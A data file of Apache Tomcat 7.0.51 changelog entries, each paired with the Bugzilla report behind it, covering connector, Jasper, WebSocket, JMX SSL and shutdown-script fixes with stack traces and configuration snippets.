Coyote|Tomcat 7.0.51 (violetagg)|fix||Avoid possible NPE if a content type is specified without a character set. (markt)|||
Coyote|Tomcat 7.0.51 (violetagg)|fix|55956|Make the forwarded remote IP address available to the Connectors via a request attribute. (markt)|Regarding Tomcat Manager Application Status|"In Tomcat Manager Application, when we browse status page report for currently running request, there is column name which shows Client IP address. If my tomcat is running Behind Proxy or Behind NGINX or Behind Apache Mod Proxy, then Client IP is IP address of Last Proxy.

I have tried to pass X-Forwarded-For parameter but there is no change in Client IP address.

Same problem exist in request.getRemoteAddr() (always returns proxy IP address) and Access Log Configuration (logs proxy IP address in access log file).

It would be nice if we can incorporate X-Forwarded-For (or like wise HTTP_X_FORWARDED_FOR,Proxy-Client-IP etc) in above situations."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55956
Coyote|Tomcat 7.0.51 (violetagg)|fix|55976|Fix sendfile support for the HTTP NIO connector. (markt)|Broken response from NIO connector in Tomcat 7.0.50|"Tomcat 7.0.50 (proposed for voting at the time of submitting this issue) with Oracle Java 1.7.0_40 on Win7 64-bit, sometimes returns incorrect response when NIO connector is used.

Start of the report, and steps to reproduce the problem are in this thread:

  http://www.mail-archive.com/dev@tomcat.apache.org/msg80175.html

-Ognjen"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55976
Coyote|Tomcat 7.0.51 (violetagg)|fix|55996|Ensure Async requests timeout correctly when using the NIO HTTP connector. (markt)|Async context does not timeout with HTTP NIO connector|"Created attachment 31200 [details]
Servlet with Async processing and Java Based client

I created a ProblemServlet which receives request via a Java based client. The Servlet starts an Async processing for each request.
Within the Async processing run() method there is a while loop which cyclically sends String messages to the client. The implementation of run method is shown.

public void run()
        {
            try
            {
                String msg = """";
                ServletOutputStream outputStream = publisherAsyncCtx.getResponse().getOutputStream();
                boolean continu = true;
                
                while (continu)
                {
                    msg = """";

                    msg = ""|"" + "" "" + new Date();
                    System.out.println(""publishing message... "" + msg);
                    
                    outputStream.println(msg);
                    publisherAsyncCtx.getResponse().flushBuffer();
                    
                    try
                    {
                        Thread.sleep(1000);
                    }
                    catch (InterruptedException e)
                    {
                        System.out.println(""sleep InterruptedException: "" + e.getMessage());
                        e.printStackTrace();
                    }
                }
            }

When a Java based console application client hits this servlet and reads its output stream, for around 10 sec the messages arrive. But after 10 seconds the connection is closed by the server.

Logs on the Server side:
Starting the Async Context.
publishing message... | Mon Jan 13 11:28:30 IST 2014
publishing message... | Mon Jan 13 11:28:31 IST 2014
publishing message... | Mon Jan 13 11:28:32 IST 2014
publishing message... | Mon Jan 13 11:28:33 IST 2014
publishing message... | Mon Jan 13 11:28:34 IST 2014
publishing message... | Mon Jan 13 11:28:35 IST 2014
publishing message... | Mon Jan 13 11:28:36 IST 2014
publishing message... | Mon Jan 13 11:28:37 IST 2014
publishing message... | Mon Jan 13 11:28:38 IST 2014
publishing message... | Mon Jan 13 11:28:39 IST 2014
publishing message... | Mon Jan 13 11:28:40 IST 2014
publishing message... | Mon Jan 13 11:28:41 IST 2014
Exception in thread ""http-bio-8080-exec-6"" java.lang.IllegalStateException: The request associated with the AsyncContext has already completed processing.
	at org.apache.catalina.core.AsyncContextImpl.check(AsyncContextImpl.java:521)
	at org.apache.catalina.core.AsyncContextImpl.getResponse(AsyncContextImpl.java:245)
	at com.pg.orion.artcloopcheck.ProblemServlet$AsynRunnable.run(ProblemServlet.java:67)
	at org.apache.catalina.core.AsyncContextImpl$RunnableWrapper.run(AsyncContextImpl.java:557)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:722)


Issue is seen with ""apache-tomcat-7.0.50"", ""apache-tomcat-7.0.47"". Not tested with other release 7 variants.
The same codebase when run on ""apache-tomcat-8.0.0-RC10"" there are no issues."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55996
Coyote|Tomcat 7.0.51 (violetagg)|add|56021|"Make it possible to use the Windows-MY key store with the BIO and NIO connectors for SSL configuration. It requires a keystoreFile="""" keystoreType=""Windows-My"" to be set on the connector. Based on a patch provided by Asanka. (markt)"|SSL connector using windows-my keystore|"Was trying to configure SSL on tomcat 7 to use Windows-MY keystore (provider that wraps the MSCAPI to access certificates in the keystore of Windows cert manager) but didn't get to work. Tomcat startup fails to load the connector since it looks for a empty file for the keystore inside catalina_home directory.

But I got it working with a small code change in org.apache.tomcat.util.net.AbstractEndpoint.adjustRelativePath() method. When Windows-MY keystore is used there is no physical keystore file. To be able to pass in empty value for the keyStoreFile in the connector I added a check for not empty path before adjusting the path.

    public String adjustRelativePath(String path, String relativeTo) {
        String newPath = path;
        if (!"""".equalsIgnoreCase(newPath)) { 
            File f = new File(newPath);
            if ( !f.isAbsolute()) {
                newPath = relativeTo + File.separator + newPath;
                f = new File(newPath);
            }
            if (!f.exists()) {
                getLog().warn(""configured file:[""+newPath+""] does not exist."");
            }
        }
        return newPath;
    }

java version ""1.7.0_07""

To reproduce (on windows):
1. Install a cert to the windows cert manager (start run certmgr.msc).
2. Configure the SSL connector with cert alias ('issued to' column value of the cert in the cermgr)
   <Connector port=""8443"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               SSLEnabled=""true""
               maxThreads=""150"" scheme=""https"" secure=""true""
               keyAlias=""ssl.cert.alias""
               keystoreFile=""""
               keystoreType=""Windows-My""
               clientAuth=""false"" sslProtocol=""TLS"" />
3. Start tomcat

The fix has been tested on windows 7 and windows server 2012."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56021
Jasper|Tomcat 7.0.51 (violetagg)|fix||Correct a regression in the XML refactoring that meant that errors in TLD files were swallowed. (markt)|||
Jasper|Tomcat 7.0.51 (violetagg)|fix|55671|Correct typo in the log message for a wrong value of genStringAsCharArray init-param of JspServlet. This parameter had a different name in Tomcat 6. (kkolinko)|Backport genStringAsCharArray patch to Tomcat 6.x branch.|"Hi,
 In the 6.x branch of Tomcat an inconsistent naming of the JSP compiler key name for using char array type instead of String causes the compiler feature to not work. I first noticed this when looking at the generated Servlet source then using a debugger to double check.
 The code has been patched in the 7.x branch in rev 889966. It corrects the key name from ""genStrAsCharArray"" to ""genStringAsCharArray"" in a couple of files.

http://svn.apache.org/viewvc?view=revision&revision=889966

 Is it possible this individual revision can be back-ported to Tomcat 6 ?

Regards,
Jeremy"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55671
Jasper|Tomcat 7.0.51 (violetagg)|fix|55973|Fix processing of XML schemas when validation is enabled in Jasper. (kkolinko)|Failure to parse MergedWebXml when validation is enabled in Jasper|"See e-mail on dev@:
""[7.0.x] Document is invalid: no grammar found. for MergedWebXml in Jasper""
http://markmail.org/message/jbnbmezbdegoufm5

This issue affects the current TC7 code (7.0.51-dev), since the following commit: http://svn.apache.org/r1552826

It does not affect 7.0.50.
(The error is generated internally, but the list of error is not checked, so it is effectively ignored).

Steps to reproduce:
1. Enable validation, by adding the following line to conf/catalina.properties

org.apache.catalina.STRICT_SERVLET_COMPLIANCE=true

2. Set JAVA_HOME variable to point a Java 6 JDK. I am using 6u45.
3. Start Tomcat
4. Go to http://localhost:8080/

Expected: index.jsp of the ROOT web application
Actual: Error 500, with the following message in localhost.DATE.log file:

08.01.2014 1:20:11 org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Servlet.service() for servlet [jsp] in context with path [] threw exception [org.apache.jasper.JasperException: XML parsing error on file org.apache.tomcat.util.scan.MergedWebXml: (line 2, col 9)] with root cause
org.xml.sax.SAXParseException: Document is invalid: no grammar found.
	at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.createSAXParseException(ErrorHandlerWrapper.java:195)
	at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.error(ErrorHandlerWrapper.java:131)
	at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:384)
	at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:318)
	at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl.scanStartElement(XMLNSDocumentScannerImpl.java:250)
	at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl$NSContentDriver.scanRootElementHook(XMLNSDocumentScannerImpl.java:626)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:3104)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(XMLDocumentScannerImpl.java:921)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:647)
	at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl.next(XMLNSDocumentScannerImpl.java:140)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
	at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:232)
	at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:284)
	at org.apache.jasper.xmlparser.ParserUtils.parseXMLDocument(ParserUtils.java:105)
	at org.apache.jasper.compiler.JspConfig.processWebDotXml(JspConfig.java:95)
	at org.apache.jasper.compiler.JspConfig.init(JspConfig.java:243)
	at org.apache.jasper.compiler.JspConfig.findJspProperty(JspConfig.java:302)
	at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:114)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
	at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:657)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:409)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1044)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:313)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
	at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55973
Jasper|Tomcat 7.0.51 (violetagg)|fix|56010|Don't throw an IllegalArgumentException when JspFactory.getPageContext is used with JspWriter.DEFAULT_BUFFER. Based on a patch by Eugene Chung. (markt)|JspFactory.getPageContext with JspWriter.DEFAULT_BUFFER throws IllegalArgumentException|"When a servlet calls JspFactory.getPageContext() with JspWriter.DEFAULT_BUFFER, Tomcat Japser throws IllegalArgumentException.

PageContext pageContext = JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, false, JspWriter.DEFAULT_BUFFER, true);


java.lang.IllegalArgumentException: Buffer size <= 0
	org.apache.jasper.runtime.JspWriterImpl.<init>(JspWriterImpl.java:81)
	org.apache.jasper.runtime.PageContextImpl._initialize(PageContextImpl.java:154)
	org.apache.jasper.runtime.PageContextImpl.initialize(PageContextImpl.java:125)
	org.apache.jasper.runtime.JspFactoryImpl.internalGetPageContext(JspFactoryImpl.java:112)
	org.apache.jasper.runtime.JspFactoryImpl.getPageContext(JspFactoryImpl.java:65)
	dvt.jsp.jaspertest.JspFactoryTestServlet.doGet(JspFactoryTestServlet.java:21)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)



Based on the description of JspFactory.getPageContext(), if buffer size is JspWriter.DEFAULT_BUFFER(-1), PageContext must treat it as implementation default, which in case is org.apache.jasper.Constants#DEFAULT_BUFFER_SIZE(8192).


buffer - size of buffer in bytes, JspWriter.NO_BUFFER if no buffer, JspWriter.DEFAULT_BUFFER if implementation default.

from http://docs.oracle.com/javaee/7/api/javax/servlet/jsp/JspFactory.html#getPageContext(javax.servlet.Servlet, javax.servlet.ServletRequest, javax.servlet.ServletResponse, java.lang.String, boolean, int, boolean)


Note that -Dorg.apache.jasper.runtime.JspFactoryImpl.USE_POOL=false should be specified."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56010
Jasper|Tomcat 7.0.51 (violetagg)|fix|56012|When using the extends attribute of the page directive do not import the super class if it is in an unnamed package as imports from unnamed packages are now explicitly illegal. (markt)|wrong import statement generation while using the extends attribute of the page directive|"Here is the test example, extends.jsp,


<%@ page import=""dvt.jsp.jaspertest.*"" %>
<%@ page extends=""TestJspBase"" %>
<%
    out.println(""TEST"");
%>


and its TestJspBase.java.


package dvt.jsp.jaspertest;

import jeus.servlet.jsp.HttpJspBase;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class TestJspBase extends HttpJspBase {
    @Override
    public void _jspService(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        /* do nothing here */
    }
}


I know that the fully qualified class name must be used while using the extends attribute of the page directive. But the java generator of jasper has also a problem.

/*
 * Generated by the Jasper component of Apache Tomcat
 * Version: Apache Tomcat/7.0.50
 * Generated at: 2014-01-15 04:56:28 UTC
 * Note: The last modified time of this file was set to
 *       the last modified time of the source file after
 *       generation to assist with modification tracking.
 */
package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;
import dvt.jsp.jaspertest.*;
import TestJspBase;

public final class extends_jsp extends TestJspBase
    implements org.apache.jasper.runtime.JspSourceDependent {



The problem is 'import TestJspBase;'.

The java language spec. does not allow the class name of default package.
http://docs.oracle.com/javase/specs/jls/se5.0/html/packages.html#70209

In my opinion, no import statement generation would be best for the simple class name.

org.apache.jasper.compiler.PageInfo

    public void setExtends(String value, Node.PageDirective n) {
        xtends = value;
    }


FYI, there was a time that such import statement was possible to use until it was fixed at JDK 1.4.
http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4361575"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56012
Jasper|Tomcat 7.0.51 (violetagg)|fix|56029|A regression in the fix for 55198 meant that when EL containing a ternary expression was used in an attribute a compilation error would occur for some expressions. (markt)|Ternary operator doesn't work as expected inside attributes in jspx pages|"The following JSPX file worked upto Tomcat 7.0.47:

<?xml version=""1.0"" encoding=""UTF-8""?>
<jsp:root xmlns:jsp=""http://java.sun.com/JSP/Page"" version=""2.1""
	xmlns:c=""http://java.sun.com/jsp/jstl/core"" 
	xmlns:fmt=""http://java.sun.com/jsp/jstl/fmt""	
>
	<jsp:directive.page contentType=""text/html; charset=utf-8""  pageEncoding=""UTF-8"" />
	<jsp:directive.page session=""false"" />
	<jsp:output omit-xml-declaration=""true"" />
	<div>	
		<span id=""mainNavNews"" class=""${currentController eq 'News' ? 'selectedItem' : ''}"">foobar</span>	
	</div>	
</jsp:root>

With tomcat 7.0.50 it fails with the following exception:

org.apache.jasper.JasperException: /WEB-INF/views/layouts/mainNavigation.jspx (line: 10, column: 87) ""${currentController eq 'News' ? 'selectedItem' : ''}"" contains invalid expression(s): javax.el.ELException: Failed to parse the expression [${currentControllereq'News'?'selectedItem':''}]
	at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:42)
	at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:443)
	at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:199)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.getJspAttribute(Validator.java:1399)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:772)
	at org.apache.jasper.compiler.Node$UninterpretedTag.accept(Node.java:1251)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:779)
	at org.apache.jasper.compiler.Node$UninterpretedTag.accept(Node.java:1251)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:529)
	at org.apache.jasper.compiler.Node$JspRoot.accept(Node.java:564)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2433)
	at org.apache.jasper.compiler.Node$Root.accept(Node.java:474)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Validator.validateExDirectives(Validator.java:1817)
	at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:217)
	at org.apache.jasper.compiler.Compiler.__compile(Compiler.java:373)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
	at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:657)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	at org.apache.jasper.servlet.JspServlet._serviceJspFile(JspServlet.java:390)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)

It works when the ternary operation doesn't appear inside an attribute or instead of eq '==' is used."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56029
Jasper|Tomcat 7.0.51 (violetagg)|fix||Correct several errors in jspxml Schema and DTD. (kkolinko)|||
Jasper|Tomcat 7.0.51 (violetagg)|fix||Change default value of the blockExternal attribute of JspC task. The default value is true. Add support for -no-blockExternal switch when JspC is run as a standalone application. (kkolinko)|||
Cluster|Tomcat 7.0.51 (violetagg)|code||Simplify the code of o.a.c.ha.tcp.SimpleTcpCluster.createManager(String). Remove unnecessary class cast. (kfujino)|||
WebSocket|Tomcat 7.0.51 (violetagg)|fix||Do not return an empty string for the Sec-WebSocket-Protocol HTTP header when no sub-protocol has been requested or no sub-protocol could be agreed as RFC6455 requires that no Sec-WebSocket-Protocol header is returned in this case. (markt)|||
Web applications|Tomcat 7.0.51 (violetagg)|fix||Add index.xhtml to the welcome files list for the examples web application. (kkolinko)|||
Web applications|Tomcat 7.0.51 (violetagg)|fix||Clarify that the connectionTimeout may also be used as the read timeout when reading a request body (if any) in the documentation web application. (markt)|||
Web applications|Tomcat 7.0.51 (violetagg)|fix||Clarify the behaviour of the maxConnections attribute for a connector in the documentation web application. (markt)|||
Web applications|Tomcat 7.0.51 (violetagg)|fix|55888|Update the documentation web application to make it clearer that a Container may define no more than one Realm. (markt)|Not clear that a container may only contain a single Realm in server.xml|"I defined a realm in server.xml...

inside
<Engine name=""Catalina"" defaultHost=""localhost"">

below the block
<!-- Use the LockOutRealm to prevent attempts to guess user passwords
     via a brute-force attack -->
<Realm className=""org.apache.catalina.realm.LockOutRealm"">
  <!-- This Realm uses the UserDatabase configured in the global JNDI
       resources under the key ""UserDatabase"".  Any edits
       that are performed against this UserDatabase are immediately
       available for use by the Realm.  -->
  <Realm className=""org.apache.catalina.realm.UserDatabaseRealm""
         resourceName=""UserDatabase""/>
</Realm>

add
<Realm className=""org.apache.catalina.realm.MemoryRealm""
    digest=""MD5"" pathname=""conf/my-realm.xml""/>

It works fine initially. Later, I move the realm def above that block. The config is not changed logically, but then authentication of my realm fails."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55888
Web applications|Tomcat 7.0.51 (violetagg)|fix|55956|Where available, displayed the forwarded remote IP address available on the status page of the Manager web application. (markt)|Regarding Tomcat Manager Application Status|"In Tomcat Manager Application, when we browse status page report for currently running request, there is column name which shows Client IP address. If my tomcat is running Behind Proxy or Behind NGINX or Behind Apache Mod Proxy, then Client IP is IP address of Last Proxy.

I have tried to pass X-Forwarded-For parameter but there is no change in Client IP address.

Same problem exist in request.getRemoteAddr() (always returns proxy IP address) and Access Log Configuration (logs proxy IP address in access log file).

It would be nice if we can incorporate X-Forwarded-For (or like wise HTTP_X_FORWARDED_FOR,Proxy-Client-IP etc) in above situations."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55956
Web applications|Tomcat 7.0.51 (violetagg)|fix||Correct links to the Tomcat mailing lists in the ROOT web application. (kkolinko)|||
Web applications|Tomcat 7.0.51 (violetagg)|fix||In Manager web application improve handling of file upload errors. Display a message instead of error 500 page. Simplify parts handling code, as it is known that Tomcat takes care of them when recycling a request. (kkolinko)|||
Extras|Tomcat 7.0.51 (violetagg)|fix||55166, 56045: Copy the XML schemas used for validation that are packaged in jsp-api.jar to servlet-api.jar so that an embedded Tomcat instance can start without Jasper being available. This also enables validation to work without Jasper being available. (markt/kkolinko)|schemaLocation references between servlet and jsp XSDs are invalid|The javax/servlet/resources package does not contain the JSP specification XSDs. These are referenced from the web-app or web-common xsds and define elements like <jsp-config>.|https://bz.apache.org/bugzilla/show_bug.cgi?id=55166
Extras|Tomcat 7.0.51 (violetagg)|fix|56039|Enable the JmxRemoteLifecycleListener to work over SSL. Patch by esengstrom. (markt)|JmxRemoteLifecycleListener does not work with SSL|"Created attachment 31242 [details]
Patch against http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk

Using JmxRemoteLifecycleListener with SSL results in the following error on startup:

Jan 16, 2014 4:34:20 PM org.apache.catalina.mbeans.JmxRemoteLifecycleListener createServer
SEVERE: The JMX connector server could not be created or failed to start for the Platform server
java.io.IOException: Cannot bind to URL [rmi://localhost:1900/jmxrmi]: javax.naming.CommunicationException [Root exception is java.rmi.ConnectIOException: non-JRMP server at remote endpoint]
        at javax.management.remote.rmi.RMIConnectorServer.newIOException(Unknown Source)
        at javax.management.remote.rmi.RMIConnectorServer.start(Unknown Source)
        at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.createServer(JmxRemoteLifecycleListener.java:304)
        at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.lifecycleEvent(JmxRemoteLifecycleListener.java:258)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
        at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:347)
        at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:725)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:691)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.commons.daemon.support.DaemonLoader.start(DaemonLoader.java:243)
Caused by: javax.naming.CommunicationException [Root exception is java.rmi.ConnectIOException: non-JRMP server at remote endpoint]
        at com.sun.jndi.rmi.registry.RegistryContext.bind(Unknown Source)
        at com.sun.jndi.toolkit.url.GenericURLContext.bind(Unknown Source)
        at javax.naming.InitialContext.bind(Unknown Source)
        at javax.management.remote.rmi.RMIConnectorServer.bind(Unknown Source)
        ... 20 more
Caused by: java.rmi.ConnectIOException: non-JRMP server at remote endpoint
        at sun.rmi.transport.tcp.TCPChannel.createConnection(Unknown Source)
        at sun.rmi.transport.tcp.TCPChannel.newConnection(Unknown Source)
        at sun.rmi.server.UnicastRef.newCall(Unknown Source)
        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)
        ... 24 more


The relevant configuration from server.xml:

<Listener className=""org.apache.catalina.mbeans.JmxRemoteLifecycleListener"" rmiRegistryPortPlatform=""1900"" rmiServerPortPlatform=""11900"" />

and java properties:

-Djavax.net.ssl.keyStore=$KEYSTORE -Djavax.net.ssl.keyStorePassword=$KEY_PASS -Dcom.sun.management.jmxremote.ssl.need.client.auth=true -Djavax.net.ssl.trustStore=$TRUSTSTORE -Djavax.net.ssl.trustStorePassword=$TRUST_PASS -Dcom.sun.management.jmxremote.registry.ssl=true -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Djava.rmi.server.hostname=$HOST_IP -Dcom.sun.management.jmxremote.ssl=true

If com.sun.management.jmxremote.ssl is changed to false everything works as expected except without SSL.

Looking at the source code, I there is a property missing from the environment:

 env.put(""com.sun.jndi.rmi.factory.socket"", csf);

Adding this to JmxRemoteLifecycleListener allows SSL to work properly.

Patch attatched."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56039
Other|Tomcat 7.0.51 (violetagg)|fix|55743|Enable the stop script to work when the shutdown port is disabled and a PID file is defined. This is only available on platforms that use catalina.sh. (markt)|Shutdown script broken on linux when only using PID-File|"I disabled the tomcat shutdown port on my production systems for sanity and security reasons. I'm only using the CATALINA_PID mechanism.

When shutting down the the tomcat server with ./shutdown.sh, nothing happens. I always have to use ./shutdown.sh -force which triggers an kill -9 internally.

When using ""kill <tomcatpid>"", the tomcat is shutting down cleanly.

In the catalina.sh i can only find kill -0 and kill -9, but no normal kill (SIGTERM).

I would expect, that the ./shutdown.sh / catalina.sh script at first sends a normal kill (15, SIGTERM), and, if the -force parameter is set, sends an kill -9 after a small timeout - but that never happens.

This problem exists with all tomcat 7 versions on 32 / 64 bit linux."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55743
Other|Tomcat 7.0.51 (violetagg)|fix|55986|When forcing Tomcat to stop via kill -9 $CATALINA_PID, the catalina.sh script could incorrectly report that Tomcat had not yet completely stopped when it had. Based on a patch by jess. (markt)|"catalina.sh -force may falsely report ""Tomcat has not been killed completely yet"""|"Created attachment 31197 [details]
catalina.sh patch

When catalina.sh -force is called and rm -f ""$CATALINA_PID"" succeeds, KILL_SLEEP_INTERVAL is not set to zero and the warning ""Tomcat has not been killed completely yet"" is falsely reported.

This may be fixed by moving the KILL_SLEEP_INTERVAL=0 statement out below the ""rm -f ""$CATALINA_PID"" error handling block. See attached patch."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55986
Other|Tomcat 7.0.51 (violetagg)|fix||Package correct license and notice files with embedded JARs. (markt)|||
Other|Tomcat 7.0.51 (violetagg)|code||Remove svn keywords (such as $Id) from source files and documentation. (kkolinko)|||
Other|Tomcat 7.0.51 (violetagg)|fix||Fix CVE-2014-0050, a denial of service with a malicious, malformed Content-Type header and multipart request processing. Fixed by merging latest code (r1565163) from Commons FileUpload. (markt)|||
Other|Tomcat 7.0.51 (violetagg)|fix|56115|Expose the httpusecaches property of Ant's get task as some users may need to change the default. Based on a suggestion by Anthony. (markt)|Need to provide parameters to Ant's get task to reliably download behind firewall and proxy|"In trying to build at work, when the ant process pulls dependencies for Tomcat, it would often hang and timeout, failing at that particular download.

I debugged some and realized that it was due to default value of get's ""usehttpcaches"" property set to true.  I edited the build file's trydownload target to be this:

  <target name=""trydownload"" if=""trydownload.run"" depends=""trydownload.check"">
    <!-- Downloads a file if not yet downloaded and the source URL is available -->
    <get src=""${sourcefile}"" retries=""${trydownload.retries}"" httpusecaches=""${trydownload.httpusecaches}"" dest=""${destfile}"" />
  </target>

and I added these in build.properties.default:

trydownload.retries=3
trydownload.httpusecaches=false

This would keep the default behavior implied with ant's get task.  Then I overrode that httpusecaches value in my build.properties file, and it reliably works all the time.  I left the retries value as it didn't change my results but thought it could prove useful for others."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56115
Catalina|Tomcat 7.0.50 (violetagg)|fix||Handle the case where a context.xml file is added to a web application deployed from a directory. Previously the file was ignored until Tomcat was restarted. Now (assuming automatic deployment is enabled) it will trigger a redeploy of the web application. (markt)|||
Catalina|Tomcat 7.0.50 (violetagg)|fix||Fix string comparison in HostConfig.setContextClass(). (kkolinko)|||
Catalina|Tomcat 7.0.50 (violetagg)|code||Streamline handling of WebSocket messages when no handler is configured for the message currently being received. (markt)|||
